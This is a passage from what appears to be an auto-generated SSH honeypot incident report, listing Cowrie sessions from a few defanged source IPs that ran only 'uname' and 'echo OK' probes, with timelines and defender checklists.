- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93239d670918

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:36 |
| **Last Seen** | 2026-06-25 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:36:20` | `cowrie.session.connect` |
| `2026-06-25 17:36:20` | `cowrie.client.version` |
| `2026-06-25 17:36:20` | `cowrie.client.kex` |
| `2026-06-25 17:36:21` | `cowrie.login.success` |
| `2026-06-25 17:36:21` | `cowrie.session.params` |
| `2026-06-25 17:36:21` | `cowrie.command.input` |
| `2026-06-25 17:36:22` | `cowrie.log.closed` |
| `2026-06-25 17:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6860d6cc60ab

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 17:36 |
| **Last Seen** | 2026-06-25 17:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:36:42` | `cowrie.session.connect` |
| `2026-06-25 17:36:43` | `cowrie.client.version` |
| `2026-06-25 17:36:43` | `cowrie.client.kex` |
| `2026-06-25 17:36:45` | `cowrie.login.success` |
| `2026-06-25 17:36:47` | `cowrie.session.params` |
| `2026-06-25 17:36:47` | `cowrie.command.input` |
| `2026-06-25 17:36:47` | `cowrie.log.closed` |
| `2026-06-25 17:36:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d575bc94df8e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:37 |
| **Last Seen** | 2026-06-25 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:37:22` | `cowrie.session.connect` |
| `2026-06-25 17:37:22` | `cowrie.client.version` |
| `2026-06-25 17:37:22` | `cowrie.client.kex` |
| `2026-06-25 17:37:22` | `cowrie.login.success` |
| `2026-06-25 17:37:23` | `cowrie.session.params` |
| `2026-06-25 17:37:23` | `cowrie.command.input` |
| `2026-06-25 17:37:23` | `cowrie.log.closed` |
| `2026-06-25 17:37:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c382a80d6b5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:38 |
| **Last Seen** | 2026-06-25 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:38:23` | `cowrie.session.connect` |
| `2026-06-25 17:38:23` | `cowrie.client.version` |
| `2026-06-25 17:38:23` | `cowrie.client.kex` |
| `2026-06-25 17:38:24` | `cowrie.login.success` |
| `2026-06-25 17:38:24` | `cowrie.session.params` |
| `2026-06-25 17:38:24` | `cowrie.command.input` |
| `2026-06-25 17:38:25` | `cowrie.log.closed` |
| `2026-06-25 17:38:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-913e9e2cba3d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:39 |
| **Last Seen** | 2026-06-25 17:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:39:24` | `cowrie.session.connect` |
| `2026-06-25 17:39:24` | `cowrie.client.version` |
| `2026-06-25 17:39:24` | `cowrie.client.kex` |
| `2026-06-25 17:39:24` | `cowrie.login.success` |
| `2026-06-25 17:39:25` | `cowrie.session.params` |
| `2026-06-25 17:39:25` | `cowrie.command.input` |
| `2026-06-25 17:39:25` | `cowrie.log.closed` |
| `2026-06-25 17:39:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9dfca591153

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:40 |
| **Last Seen** | 2026-06-25 17:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:40:23` | `cowrie.session.connect` |
| `2026-06-25 17:40:23` | `cowrie.client.version` |
| `2026-06-25 17:40:23` | `cowrie.client.kex` |
| `2026-06-25 17:40:24` | `cowrie.login.success` |
| `2026-06-25 17:40:25` | `cowrie.session.params` |
| `2026-06-25 17:40:25` | `cowrie.command.input` |
| `2026-06-25 17:40:25` | `cowrie.log.closed` |
| `2026-06-25 17:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2625bf652bb8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:41 |
| **Last Seen** | 2026-06-25 17:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:41:23` | `cowrie.session.connect` |
| `2026-06-25 17:41:23` | `cowrie.client.version` |
| `2026-06-25 17:41:23` | `cowrie.client.kex` |
| `2026-06-25 17:41:23` | `cowrie.login.success` |
| `2026-06-25 17:41:24` | `cowrie.session.params` |
| `2026-06-25 17:41:24` | `cowrie.command.input` |
| `2026-06-25 17:41:24` | `cowrie.log.closed` |
| `2026-06-25 17:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6061cff72cd7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:42 |
| **Last Seen** | 2026-06-25 17:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:42:23` | `cowrie.session.connect` |
| `2026-06-25 17:42:23` | `cowrie.client.version` |
| `2026-06-25 17:42:23` | `cowrie.client.kex` |
| `2026-06-25 17:42:24` | `cowrie.login.success` |
| `2026-06-25 17:42:25` | `cowrie.session.params` |
| `2026-06-25 17:42:25` | `cowrie.command.input` |
| `2026-06-25 17:42:25` | `cowrie.log.closed` |
| `2026-06-25 17:42:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6548f3b71623

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:43 |
| **Last Seen** | 2026-06-25 17:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:43:26` | `cowrie.session.connect` |
| `2026-06-25 17:43:26` | `cowrie.client.version` |
| `2026-06-25 17:43:26` | `cowrie.client.kex` |
| `2026-06-25 17:43:27` | `cowrie.login.success` |
| `2026-06-25 17:43:27` | `cowrie.session.params` |
| `2026-06-25 17:43:27` | `cowrie.command.input` |
| `2026-06-25 17:43:27` | `cowrie.log.closed` |
| `2026-06-25 17:43:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01741e85f225

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:44 |
| **Last Seen** | 2026-06-25 17:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:44:30` | `cowrie.session.connect` |
| `2026-06-25 17:44:30` | `cowrie.client.version` |
| `2026-06-25 17:44:30` | `cowrie.client.kex` |
| `2026-06-25 17:44:30` | `cowrie.login.success` |
| `2026-06-25 17:44:31` | `cowrie.session.params` |
| `2026-06-25 17:44:31` | `cowrie.command.input` |
| `2026-06-25 17:44:31` | `cowrie.log.closed` |
| `2026-06-25 17:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-954d3c167ee0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:45 |
| **Last Seen** | 2026-06-25 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:45:32` | `cowrie.session.connect` |
| `2026-06-25 17:45:32` | `cowrie.client.version` |
| `2026-06-25 17:45:32` | `cowrie.client.kex` |
| `2026-06-25 17:45:32` | `cowrie.login.success` |
| `2026-06-25 17:45:33` | `cowrie.session.params` |
| `2026-06-25 17:45:33` | `cowrie.command.input` |
| `2026-06-25 17:45:33` | `cowrie.log.closed` |
| `2026-06-25 17:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bb839ead961

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 17:46 |
| **Last Seen** | 2026-06-25 17:46 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:46:31` | `cowrie.session.connect` |
| `2026-06-25 17:46:32` | `cowrie.client.version` |
| `2026-06-25 17:46:32` | `cowrie.client.kex` |
| `2026-06-25 17:46:39` | `cowrie.login.success` |
| `2026-06-25 17:46:42` | `cowrie.session.params` |
| `2026-06-25 17:46:42` | `cowrie.command.input` |
| `2026-06-25 17:46:44` | `cowrie.log.closed` |
| `2026-06-25 17:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-529a80fa86e8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:46 |
| **Last Seen** | 2026-06-25 17:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:46:33` | `cowrie.session.connect` |
| `2026-06-25 17:46:33` | `cowrie.client.version` |
| `2026-06-25 17:46:33` | `cowrie.client.kex` |
| `2026-06-25 17:46:33` | `cowrie.login.success` |
| `2026-06-25 17:46:34` | `cowrie.session.params` |
| `2026-06-25 17:46:34` | `cowrie.command.input` |
| `2026-06-25 17:46:34` | `cowrie.log.closed` |
| `2026-06-25 17:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a44ea27498bd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:47 |
| **Last Seen** | 2026-06-25 17:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:47:34` | `cowrie.session.connect` |
| `2026-06-25 17:47:34` | `cowrie.client.version` |
| `2026-06-25 17:47:34` | `cowrie.client.kex` |
| `2026-06-25 17:47:34` | `cowrie.login.success` |
| `2026-06-25 17:47:35` | `cowrie.session.params` |
| `2026-06-25 17:47:35` | `cowrie.command.input` |
| `2026-06-25 17:47:35` | `cowrie.log.closed` |
| `2026-06-25 17:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-851307ee64d6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:48 |
| **Last Seen** | 2026-06-25 17:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:48:35` | `cowrie.session.connect` |
| `2026-06-25 17:48:35` | `cowrie.client.version` |
| `2026-06-25 17:48:35` | `cowrie.client.kex` |
| `2026-06-25 17:48:35` | `cowrie.login.success` |
| `2026-06-25 17:48:36` | `cowrie.session.params` |
| `2026-06-25 17:48:36` | `cowrie.command.input` |
| `2026-06-25 17:48:36` | `cowrie.log.closed` |
| `2026-06-25 17:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e44ef0b009c1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:49 |
| **Last Seen** | 2026-06-25 17:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:49:38` | `cowrie.session.connect` |
| `2026-06-25 17:49:38` | `cowrie.client.version` |
| `2026-06-25 17:49:38` | `cowrie.client.kex` |
| `2026-06-25 17:49:38` | `cowrie.login.success` |
| `2026-06-25 17:49:39` | `cowrie.session.params` |
| `2026-06-25 17:49:39` | `cowrie.command.input` |
| `2026-06-25 17:49:39` | `cowrie.log.closed` |
| `2026-06-25 17:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0df90a2c4fc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:50 |
| **Last Seen** | 2026-06-25 17:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:50:41` | `cowrie.session.connect` |
| `2026-06-25 17:50:41` | `cowrie.client.version` |
| `2026-06-25 17:50:41` | `cowrie.client.kex` |
| `2026-06-25 17:50:42` | `cowrie.login.success` |
| `2026-06-25 17:50:42` | `cowrie.session.params` |
| `2026-06-25 17:50:42` | `cowrie.command.input` |
| `2026-06-25 17:50:43` | `cowrie.log.closed` |
| `2026-06-25 17:50:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbbeb613e14f

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 17:51 |
| **Last Seen** | 2026-06-25 17:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:51:23` | `cowrie.session.connect` |
| `2026-06-25 17:51:24` | `cowrie.client.version` |
| `2026-06-25 17:51:24` | `cowrie.client.kex` |
| `2026-06-25 17:51:25` | `cowrie.login.success` |
| `2026-06-25 17:51:27` | `cowrie.session.params` |
| `2026-06-25 17:51:27` | `cowrie.command.input` |
| `2026-06-25 17:51:27` | `cowrie.log.closed` |
| `2026-06-25 17:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd5a2878621a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:51 |
| **Last Seen** | 2026-06-25 17:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:51:44` | `cowrie.session.connect` |
| `2026-06-25 17:51:44` | `cowrie.client.version` |
| `2026-06-25 17:51:44` | `cowrie.client.kex` |
| `2026-06-25 17:51:44` | `cowrie.login.success` |
| `2026-06-25 17:51:45` | `cowrie.session.params` |
| `2026-06-25 17:51:45` | `cowrie.command.input` |
| `2026-06-25 17:51:45` | `cowrie.log.closed` |
| `2026-06-25 17:51:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb94a4f971f6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:52 |
| **Last Seen** | 2026-06-25 17:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:52:47` | `cowrie.session.connect` |
| `2026-06-25 17:52:47` | `cowrie.client.version` |
| `2026-06-25 17:52:47` | `cowrie.client.kex` |
| `2026-06-25 17:52:47` | `cowrie.login.success` |
| `2026-06-25 17:52:48` | `cowrie.session.params` |
| `2026-06-25 17:52:48` | `cowrie.command.input` |
| `2026-06-25 17:52:48` | `cowrie.log.closed` |
| `2026-06-25 17:52:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebb25741630d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:53 |
| **Last Seen** | 2026-06-25 17:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:53:50` | `cowrie.session.connect` |
| `2026-06-25 17:53:50` | `cowrie.client.version` |
| `2026-06-25 17:53:50` | `cowrie.client.kex` |
| `2026-06-25 17:53:50` | `cowrie.login.success` |
| `2026-06-25 17:53:51` | `cowrie.session.params` |
| `2026-06-25 17:53:51` | `cowrie.command.input` |
| `2026-06-25 17:53:51` | `cowrie.log.closed` |
| `2026-06-25 17:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e512e9d022b8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:54 |
| **Last Seen** | 2026-06-25 17:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:54:53` | `cowrie.session.connect` |
| `2026-06-25 17:54:53` | `cowrie.client.version` |
| `2026-06-25 17:54:53` | `cowrie.client.kex` |
| `2026-06-25 17:54:54` | `cowrie.login.success` |
| `2026-06-25 17:54:54` | `cowrie.session.params` |
| `2026-06-25 17:54:54` | `cowrie.command.input` |
| `2026-06-25 17:54:54` | `cowrie.log.closed` |
| `2026-06-25 17:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c73c0d7b3716

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:55 |
| **Last Seen** | 2026-06-25 17:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:55:58` | `cowrie.session.connect` |
| `2026-06-25 17:55:58` | `cowrie.client.version` |
| `2026-06-25 17:55:58` | `cowrie.client.kex` |
| `2026-06-25 17:55:58` | `cowrie.login.success` |
| `2026-06-25 17:55:59` | `cowrie.session.params` |
| `2026-06-25 17:55:59` | `cowrie.command.input` |
| `2026-06-25 17:55:59` | `cowrie.log.closed` |
| `2026-06-25 17:55:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19c0f757eb32

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:57 |
| **Last Seen** | 2026-06-25 17:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:57:04` | `cowrie.session.connect` |
| `2026-06-25 17:57:04` | `cowrie.client.version` |
| `2026-06-25 17:57:04` | `cowrie.client.kex` |
| `2026-06-25 17:57:04` | `cowrie.login.success` |
| `2026-06-25 17:57:05` | `cowrie.session.params` |
| `2026-06-25 17:57:05` | `cowrie.command.input` |
| `2026-06-25 17:57:05` | `cowrie.log.closed` |
| `2026-06-25 17:57:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72d168bc45e3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 17:58 |
| **Last Seen** | 2026-06-25 17:58 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:58:01` | `cowrie.session.connect` |
| `2026-06-25 17:58:02` | `cowrie.client.version` |
| `2026-06-25 17:58:02` | `cowrie.client.kex` |
| `2026-06-25 17:58:08` | `cowrie.login.success` |
| `2026-06-25 17:58:13` | `cowrie.session.params` |
| `2026-06-25 17:58:13` | `cowrie.command.input` |
| `2026-06-25 17:58:14` | `cowrie.log.closed` |
| `2026-06-25 17:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0f4cb843ed5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:58 |
| **Last Seen** | 2026-06-25 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:58:09` | `cowrie.session.connect` |
| `2026-06-25 17:58:09` | `cowrie.client.version` |
| `2026-06-25 17:58:09` | `cowrie.client.kex` |
| `2026-06-25 17:58:09` | `cowrie.login.success` |
| `2026-06-25 17:58:10` | `cowrie.session.params` |
